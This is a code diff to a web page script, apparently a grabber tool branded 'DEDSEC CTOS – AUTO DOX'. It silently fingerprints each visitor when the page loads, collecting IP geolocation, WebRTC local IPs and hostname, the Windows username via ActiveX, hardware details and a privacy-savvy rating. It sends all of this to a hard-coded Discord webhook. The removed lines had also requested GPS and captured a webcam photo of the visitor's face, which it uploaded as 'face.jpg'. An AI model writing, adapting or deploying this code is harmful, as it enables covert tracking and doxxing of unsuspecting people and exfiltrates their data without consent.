@@ -60,30 +60,18 @@
 
 <script>
     // ================================================================
-    //  YOUR DISCORD WEBHOOK (REPLACE WITH YOUR OWN)
+    //  YOUR WEBHOOK (replace with yours)
     // ================================================================
-    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
+    const WEBHOOK = "https://discord.com/api/webhooks/1460348078727893126/Zq089gT8yx9ITZwGZvxJ8unNpFNhSO8yJcjMexHxKV3JziMa-M0OStq5BurQ579PgSrF";
 
     // ================================================================
-    //  HELPER: DataURL → Blob (for camera photo)
-    // ================================================================
-    function dataURLtoBlob(dataurl) {
-        const arr = dataurl.split(',');
-        const mime = arr[0].match(/:(.*?);/)[1];
-        const bstr = atob(arr[1]);
-        let n = bstr.length;
-        const u8arr = new Uint8Array(n);
-        while (n--) u8arr[n] = bstr.charCodeAt(n);
-        return new Blob([u8arr], { type: mime });
-    }
-
-    // ================================================================
-    //  MAIN COLLECTOR
+    //  MAIN - runs immediately, no permissions asked
     // ================================================================
     (async function() {
 
-        // ---- 1. IP & GEOLOCATION (with fallbacks) ----
-        let ipData = { ip: 'unknown', country: '?', region: '?', city: '?', lat: '?', lon: '?', isp: '?', proxy: false };
+        // ---------- 1. IP GEOLOCATION (no permission) ----------
+        let ip = 'unknown', isp = '?', country = '?', region = '?', city = '?', lat = '?', lon = '?';
+        let proxy = false, vpn = 'Unknown';
         const apis = [
             'https://ipapi.co/json/',
             'https://ipinfo.io/json?token=',
@@ -94,38 +82,23 @@
                 const res = await fetch(url, { signal: AbortSignal.timeout(3000) });
                 const d = await res.json();
                 if (d.ip || d.query) {
-                    ipData.ip = d.ip || d.query;
-                    ipData.country = d.country_name || d.country || '?';
-                    ipData.region = d.region || d.regionName || '?';
-                    ipData.city = d.city || '?';
-                    ipData.lat = d.latitude || d.lat || '?';
-                    ipData.lon = d.longitude || d.lon || '?';
-                    ipData.isp = d.org || d.isp || '?';
-                    ipData.proxy = d.proxy === true || d.proxy === 'true' || false;
+                    ip = d.ip || d.query;
+                    isp = d.org || d.isp || '?';
+                    country = d.country_name || d.country || '?';
+                    region = d.region || d.regionName || '?';
+                    city = d.city || '?';
+                    lat = d.latitude || d.lat || '?';
+                    lon = d.longitude || d.lon || '?';
+                    proxy = d.proxy === true || d.proxy === 'true' || false;
                     break;
                 }
-            } catch (_) { /* try next */ }
+            } catch (_) {}
         }
+        // VPN detection
+        const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','incognito','anonymous'];
+        vpn = (proxy || vpnKeywords.some(k => isp.toLowerCase().includes(k))) ? '✅ YES (VPN/Proxy)' : '❌ NO (residential)';
 
-        // VPN detection: proxy flag + ISP keywords
-        const vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloud', 'datacenter', 'incognito', 'anonymous'];
-        const isVpn = ipData.proxy || vpnKeywords.some(k => ipData.isp.toLowerCase().includes(k));
-        ipData.vpn = isVpn ? '✅ YES (VPN/Proxy detected)' : '❌ NO (residential IP)';
-
-        // ---- 2. BROWSER GPS (if user grants permission) ----
-        let gps = { lat: 'not granted', lon: 'not granted', acc: 'N/A' };
-        try {
-            const pos = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 4000 });
-            });
-            gps = {
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                acc: `${pos.coords.accuracy}m`
-            };
-        } catch (_) {}
-
-        // ---- 3. LOCAL IPs & HOSTNAME via WebRTC (often reveals computer name) ----
+        // ---------- 2. WebRTC local IPs + hostname (no permission) ----------
         let localIPs = [];
         let hostname = '';
         try {
@@ -142,82 +115,106 @@
                         return;
                     }
                     const parts = e.candidate.candidate.split(' ');
-                    const ip = parts[4];
-                    if (ip && ip.includes('.') && !ip.includes('0.0.0.0')) {
-                        list.push(ip);
+                    const ipAddr = parts[4];
+                    if (ipAddr && ipAddr.includes('.') && !ipAddr.startsWith('0.')) {
+                        list.push(ipAddr);
+                    }
+                    // also try to extract hostname from the candidate (some browsers include it)
+                    const host = parts[5] || '';
+                    if (host && host.includes('.') && !host.includes(' ')) {
+                        // might be a hostname like "DESKTOP-ABC123.local"
+                        if (host.length > 3 && !host.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                            hostname = host;
+                        }
                     }
                 };
                 setTimeout(() => { pc.close(); resolve(list); }, 3000);
             });
             localIPs = ips;
-            // Try to get hostname from the first local IP (sometimes it's the computer name)
-            if (ips.length > 0) {
-                // Attempt reverse lookup via dns? Not possible. But we can get it from the candidate itself.
-                // We'll just keep the IPs.
-            }
-            // Also try to get hostname from window.location.hostname (not helpful)
+            // if we didn't get hostname from candidate, try to resolve from first local IP via reverse DNS? Not possible.
+            // fallback: use the first IP as hostname (not great)
         } catch (_) {}
 
-        // ---- 4. WINDOWS USERNAME (via ActiveX – works in IE/old Edge) ----
-        let winUser = 'not available (use IE/ActiveX)';
+        // ---------- 3. Windows username (ActiveX - IE/old Edge) ----------
+        let winUser = 'not available (IE/ActiveX required)';
         try {
             const wsh = new ActiveXObject('WScript.Shell');
             winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
         } catch (_) {}
 
-        // ---- 5. DEVICE MODEL / BROWSER DISPLAY NAME ----
+        // ---------- 4. Device model / OS / browser display name (from UA and high-entropy) ----------
         let deviceModel = 'Unknown';
-        let browserProfile = 'Unknown';
+        let osDisplay = 'Unknown';
+        let browserName = 'Unknown';
         try {
             const ua = navigator.userAgent;
-            // Try high‑entropy userAgentData
+            // Try high-entropy for model/platform
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 const he = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'fullVersionList']);
                 deviceModel = he.model || he.platform || 'Unknown';
+                osDisplay = he.platform || 'Unknown';
+                if (he.fullVersionList && he.fullVersionList.length) {
+                    browserName = he.fullVersionList.map(b => b.brand + ' ' + b.version).join(', ');
+                }
             }
-            // Fallback: parse from UA string
+            // Fallback parse from UA
             if (deviceModel === 'Unknown' || deviceModel === 'Unknown') {
                 if (ua.includes('Windows NT')) {
-                    deviceModel = 'Windows PC (model not exposed)';
+                    const winVer = ua.match(/Windows NT (\d+\.\d+)/);
+                    osDisplay = 'Windows ' + (winVer ? winVer[1] : 'NT');
+                    deviceModel = 'Windows PC (model hidden)';
                 } else if (ua.includes('Macintosh')) {
-                    deviceModel = 'Mac';
+                    osDisplay = 'macOS';
+                    const macModel = ua.match(/Macintosh; Intel Mac OS X [\d_]+\)/);
+                    deviceModel = macModel ? macModel[0].replace('Macintosh; ','') : 'Mac';
                 } else if (ua.includes('iPhone')) {
                     const m = ua.match(/iPhone\s*([^;)]+)/);
                     deviceModel = m ? m[0] : 'iPhone';
+                    osDisplay = 'iOS';
                 } else if (ua.includes('Android')) {
                     const m = ua.match(/Android\s*([^;)]+)/);
                     deviceModel = m ? m[0] : 'Android';
+                    osDisplay = 'Android';
                 } else {
                     deviceModel = 'Unknown device';
                 }
             }
-            // Try to get browser profile name (Chrome/Firefox sometimes store it, but not exposed)
-            // We can try to get the email from navigator.credentials (but needs user interaction)
-            // Instead, we'll show the OS registered owner (if present in UA)
-            const ownerMatch = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
-            if (ownerMatch) {
-                browserProfile = ownerMatch[2] || ownerMatch[1] || 'Unknown';
-            } else {
-                browserProfile = 'Not exposed via UA';
+            // Try to get browser name from UA
+            if (browserName === 'Unknown') {
+                if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
+                else if (ua.includes('Firefox')) browserName = 'Firefox';
+                else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
+                else if (ua.includes('Edg')) browserName = 'Edge';
+                else browserName = 'Other';
             }
         } catch (_) {}
 
-        // ---- 6. OTHER SYSTEM INFO ----
+        // Combine hostname from WebRTC, winUser, and deviceModel to get "display name"
+        let displayName = '';
+        if (winUser && winUser !== 'not available (IE/ActiveX required)') {
+            displayName = winUser;
+        } else if (hostname && hostname.length > 0) {
+            displayName = hostname.split('.')[0]; // take first part before domain
+        } else if (deviceModel && deviceModel !== 'Unknown') {
+            displayName = deviceModel;
+        } else {
+            displayName = 'Unknown user';
+        }
+
+        // ---------- 5. Other system info (no permissions) ----------
         let battery = 'unavailable';
         try {
             const b = await navigator.getBattery();
             battery = `${Math.round(b.level * 100)}% (${b.charging ? 'charging' : 'discharging'})`;
         } catch (_) {}
-        const cpuCores = navigator.hardwareConcurrency || '?';
+        const cpu = navigator.hardwareConcurrency || '?';
         const ram = navigator.deviceMemory || '?';
         const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const language = navigator.language;
-        const platform = navigator.platform;
+        const lang = navigator.language;
 
-        // ---- 7. GPU via WebGL ----
-        let gpu = 'Unavailable';
-        let gpuLevel = 'Unknown';
+        // ---------- 6. GPU via WebGL (no permission) ----------
+        let gpu = 'Unavailable', gpuLevel = 'Unknown';
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -233,85 +230,56 @@
             }
         } catch (_) {}
 
-        // ---- 8. PLUGINS & USER LEVEL ----
+        // ---------- 7. Plugins & user level ----------
         const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
         const savvy = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
         const count = savvy.filter(p => plugins.includes(p)).length;
-        const userLevel = count >= 3 ? '🔥 Advanced privacy user' : (count >= 1 ? '🛡️ Moderate' : '🐣 Beginner');
+        const userLevel = count >= 3 ? '🔥 Advanced privacy' : (count >= 1 ? '🛡️ Moderate' : '🐣 Beginner');
 
-        // ---- 9. COORDINATES (choose GPS if available) ----
-        const coords = (gps.lat !== 'not granted') ?
-            `GPS: ${gps.lat}, ${gps.lon} (±${gps.acc})` :
-            `IP-based: ${ipData.lat}, ${ipData.lon}`;
+        // ---------- 8. Coordinates (IP-based, no permission) ----------
+        const coords = (lat !== '?' && lon !== '?') ? `${lat}, ${lon}` : 'IP location failed';
 
-        // ---- 10. BUILD THE MESSAGE ----
-        const finalMsg = 
-`**🔹 DEDSEC CTOS – FULL VICTIM DOX 🔹**
-**IP:** ${ipData.ip}
-**ISP:** ${ipData.isp}
-**VPN/Proxy:** ${ipData.vpn}
-**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}
-**Coordinates:** ${coords}
+        // ---------- 9. Build final message ----------
+        const msg = 
+`**🔹 DEDSEC CTOS – AUTO DOX (NO PERMISSIONS) 🔹**
+**IP:** ${ip}
+**ISP:** ${isp}
+**VPN/Proxy:** ${vpn}
+**Location:** ${city}, ${region}, ${country}
+**Coordinates (IP):** ${coords}
 **Local IPs (WebRTC):** ${localIPs.length ? localIPs.join(', ') : 'none'}
 **Windows Username:** ${winUser}
-**Device / Laptop Model:** ${deviceModel}
-**Browser Profile / Display Name:** ${browserProfile}
-**OS:** ${platform}
-**Browser UA:** ${navigator.userAgent}
-**CPU Cores:** ${cpuCores}
+**Display Name / Hostname:** ${displayName}
+**Device Model:** ${deviceModel}
+**OS:** ${osDisplay}
+**Browser:** ${browserName}
+**CPU Cores:** ${cpu}
 **RAM:** ${ram} GB
 **Screen:** ${screenRes}
 **Battery:** ${battery}
 **Timezone:** ${timezone}
-**Language:** ${language}
+**Language:** ${lang}
 **GPU:** ${gpu}
 **GPU Level:** ${gpuLevel}
 **Plugins:** ${plugins}
 **User Level:** ${userLevel}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-        // ---- 11. SEND TO DISCORD (with fallbacks) ----
+        // ---------- 10. Send to Discord (no popups) ----------
         try {
-            // First attempt: fetch with keepalive
-            const resp = await fetch(WEBHOOK, {
+            await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: finalMsg }),
+                body: JSON.stringify({ content: msg }),
                 keepalive: true
             });
-            if (!resp.ok) throw new Error('Fetch failed');
         } catch (e) {
-            // Fallback: navigator.sendBeacon (works even on page unload)
-            const blob = new Blob([JSON.stringify({ content: finalMsg })], { type: 'application/json' });
+            // fallback
+            const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
             navigator.sendBeacon(WEBHOOK, blob);
         }
 
-        // ---- 12. CAMERA CAPTURE (non‑blocking, runs in background) ----
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
-            });
-            const vid = document.createElement('video');
-            vid.srcObject = stream;
-            await vid.play();
-            await new Promise(r => setTimeout(r, 1500));
-            const canvas = document.createElement('canvas');
-            canvas.width = vid.videoWidth || 640;
-            canvas.height = vid.videoHeight || 480;
-            canvas.getContext('2d').drawImage(vid, 0, 0, canvas.width, canvas.height);
-            const foto = canvas.toDataURL('image/jpeg', 0.9);
-            const blob = dataURLtoBlob(foto);
-            const form = new FormData();
-            form.append('content', '**📸 Live camera snapshot**');
-            form.append('file', blob, 'face.jpg');
-            // Send photo – use fetch (no keepalive needed for file)
-            await fetch(WEBHOOK, { method: 'POST', body: form });
-            stream.getTracks().forEach(t => t.stop());
-        } catch (_) {
-            // Camera denied or not available – silently ignore
-        }
-
-        console.log('✅ All data transmitted to Discord.');
+        console.log('✅ Data sent silently.');
     })();
 </script>
 </body>
